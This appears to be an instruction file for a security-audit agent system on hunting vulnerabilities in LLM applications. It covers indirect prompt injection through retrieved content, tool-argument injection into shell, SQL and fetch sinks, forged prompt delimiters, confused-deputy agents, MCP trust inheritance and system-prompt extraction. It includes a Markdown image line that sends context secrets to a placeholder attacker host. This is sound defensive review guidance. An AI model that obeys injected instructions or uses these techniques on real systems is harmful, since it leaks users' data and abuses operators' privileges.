# AI, LLM, and Agent Hunting

#### When to use this file

Reach for this file when the target embeds a language model in a trust-sensitive path: chatbots and assistants, RAG pipelines, agent/tool-calling loops, MCP servers and clients, code that builds prompts from untrusted input, or code that consumes model output and acts on it. These targets fail differently from ordinary web apps — the dangerous data flow is *untrusted text → model → capability or sink*, and the model is a confused deputy that will faithfully carry attacker instructions across a trust boundary the developer assumed the model would respect. It won't.

Use this alongside `ATTACK-CLASSES.md`, not instead of it: the transport is still HTTP, the tools still hit SQL/shell/filesystem sinks, and access control still applies. This file covers the model-specific layer on top.

Pick the relevant classes based on Phase 1. Split per subsystem (retrieval, tool dispatch, output rendering) for large targets.

## Core discipline (include in every agent prompt for this domain)

```
- "The model can be prompt-injected" is NOT a finding on its own. Prompt injection that only affects the attacker's own session and their own output is a party trick. A finding requires the injection to CROSS A BOUNDARY: reach a victim's context, invoke a capability the requester lacks, exfiltrate data the requester can't see, or drive a downstream sink the attacker couldn't otherwise reach (server-side SQL/shell/SSRF beyond their own session). Name the boundary crossed.
- The bug is in the CODE, not the model. The finding is the missing code-level gate between attacker-influenceable input and a dangerous capability or sink — point at the line that grants the capability, trusts the output, or feeds the context, not the model's mood. Non-determinism is not a defense: the model's probability of complying is an exploitability detail, never a reporting blocker. If the code makes the output harmless (output that never reaches a sink), there is no finding regardless of what the model can be talked into saying.
- Model output is untrusted input. Trace it to its sink with the same rigor as any user input. "It came from our model" is the exact assumption being attacked.
- A guardrail prompt ("never reveal the system prompt", "refuse harmful requests") is not a security control. Do not credit it as a mitigation. If the only thing standing between the attacker and impact is instructions in the prompt, the boundary is undefended.
```

## Prompt-injection attack classes (subagent_type: `general`)

**Indirect injection via retrieved / ingested content**
The high-value class. Attacker plants instructions in data the model later ingests in *someone else's* session: a RAG document, an indexed web page, a file upload, an email, an issue/PR body, a tool's response, a filename. Trace every source that reaches the prompt context and ask "who can write this, and whose session does it fire in?" Find the ingestion path; confirm the content reaches the context window unfiltered; confirm that context has a capability worth hijacking.

**Tool-argument injection (model output → sink)**
The model emits a tool call and the code executes it with model-generated arguments. Those arguments hit a real sink — SQL (`query(args.filter)`), shell (`exec(args.cmd)`), file path (`readFile(args.path)`), HTTP (`fetch(args.url)` → SSRF), or another API. The code trusts the arguments because "the model produced structured output." Trace each tool handler's parameters to their sink and validate them at the handler like any request body.

**Direct injection into a privileged capability**
Direct (same-session) injection only matters when the model can do something the *user* is not authorized to do directly. If the assistant runs tools under a service identity, or has a system prompt containing secrets, or can reach internal endpoints, then a user talking the model into using those crosses a privilege boundary even in their own session. If the model can only do what the user could already do via the UI, direct injection is not a finding. Hunt step: enumerate every capability the assistant holds that its users don't, then check whether same-session user text can steer the model into each.

**Prompt-template / delimiter injection**
Untrusted input concatenated into the prompt without fencing or role separation, so the attacker forges structure the orchestrator trusts: a fake system turn, a fabricated prior conversation turn, or a counterfeit tool result. The finding is the assembly code — the concatenation that lets user bytes impersonate a trusted role — not the model obeying them. Find where the prompt is built and whether untrusted spans are delimited or escaped from control text.

## Agent and tool-calling attack classes (subagent_type: `general`)

**Excessive agency / confused-deputy authority**
The agent executes tools under *its own* identity (service account, broad API key, DB superuser) rather than the requesting user's. Every tool call is then a privilege-escalation vector: the user asks, the agent acts with more authority than the user has. Check whether tool execution re-checks the *user's* permission on the *specific resource*, or just that "the agent is allowed to call this tool." The same gap at the parameter level is IDOR through tools: `get_document(id)` / `read_file(path)` with the ID filled from user text and no check that *this* user may reach *that* resource — endpoint IDOR reached by asking. Common false positive: a shared service credential that runs every query *scoped to the authenticated user's ID* is normal, safe architecture — not a confused deputy.

**Unbounded action loops / cost and side-effect abuse**
Agent loops that call tools until a goal is met: can an attacker drive an expensive or irreversible loop (spend, send, delete, external API calls) through a single crafted request? Look for tool calls with side effects inside a model-controlled iteration with no per-action authorization or budget. The impact that makes this a finding crosses out of the attacker's own session — it hits the operator's bill, a shared rate/quota limit, or other tenants' availability (denial-of-wallet), so it survives the "capability they already have" test even when the attacker only touches their own request.

**Sub-agent / MCP trust inheritance**
When an agent spawns sub-agents or connects to MCP servers, what identity and context do they inherit? A sub-agent or tool server that receives the full session, credentials, or a broader capability set than the task needs is a lateral-movement primitive. A malicious or compromised MCP server is an attacker that speaks directly into the model's context — treat its responses as indirect injection.

## Output-handling and disclosure attack classes (subagent_type: `general`)

**Insecure output rendering (XSS / injection via model output)**
Model output rendered as HTML/Markdown without sanitization → stored/reflected XSS. Markdown image/link rendering is the classic exfiltration channel: the model emits `![x](https://attacker/?d=<secret from context>)` and the client fetches it, leaking context to the attacker's server. Check where model output is displayed and whether it's treated as trusted HTML. The image-exfil channel only fires if the render surface auto-loads remote resources and no CSP `img-src` restricts the destination — if the rendering client is out of scope or unknown (native app, terminal, CSP-locked web UI), the sink is unconfirmed: treat it as unverifiable, not a finding.

**System-prompt / context extraction to a real secret**
Extraction is only a finding if the context actually contains something sensitive — API keys, other users' data, internal URLs, hidden business rules that gate access. Confirm the secret is really in the context (read the prompt-assembly code) before reporting. A leaked generic "you are a helpful assistant" prompt is not a finding.

**Cross-session / multi-tenant context bleed**
Conversation history, embeddings, or the KV/prompt cache keyed too broadly, so one user's context appears in another's session. Trace the cache/session key: is it scoped per user, or is there a path where a shared key mixes tenants? Related: retrieval (vector or keyword search) that lacks a per-tenant metadata/ACL filter at query time pulls another tenant's chunks into context — IDOR at the retrieval layer; confirm the query itself applies the tenant filter, not just that documents carry a tenant field. These are code bugs (bad cache key, shared buffer, unfiltered query), not model behavior — verify them in the storage/retrieval layer.

## Universal moves (apply across the above)

- **Draw the boundary before hunting.** Enumerate: what identity do tools run as, what's in the context window, who can write to each context source, where does output go. Most AI findings fall out of a correct map of these four; most AI false positives come from not drawing it.
- **Find the capability, then find who can reach it.** Start from the most dangerous tool (delete, spend, exec, fetch-internal) and work backwards to whether untrusted text can reach its arguments. Power × reachability, same as any privileged interface.

## Validation rules (apply before reporting ANY finding here)

1. **Name the boundary crossed.** State exactly who the attacker is, whose session/identity the payload executes in, and what they get that they couldn't get directly. If attacker and victim are the same principal and the capability is one they already have, it is not a finding.
2. **For confused-deputy / excessive-agency claims, prove both halves.** Show (a) the tool performs no per-resource check scoped to the requesting user, AND (b) the action is one the user could not perform through a normal authenticated request. A shared service credential with per-user query scoping fails both tests and is not a finding.
3. **Cite the trusting line and prove the taint reaches it.** For tool-argument and output findings, show the concrete sink (the `exec`/`query`/`fetch`/`innerHTML`) with model-influenced data reaching it unvalidated; for extraction/disclosure findings, cite the prompt-assembly code and confirm the secret or cross-tenant data is really in the context. If you can't cite the code, you have a black-box observation, not a finding.
4. **Don't assert capabilities you can't see in source.** Claims that depend on deployment facts not in the repo — whether an "internal-only" endpoint is actually unreachable by the user, what a tool's target really exposes, which client renders the output — are unverifiable from source. If the user could reach the same thing directly (flat network, same origin), it is not a privilege crossing. Confirm the capability and the boundary in code, or mark it unverifiable rather than reporting it.
5. **Return ONLY confirmed findings** with the boundary crossed, the trusting code path, and the observable result — or "No exploitable AI/LLM issues found" if that's honest.
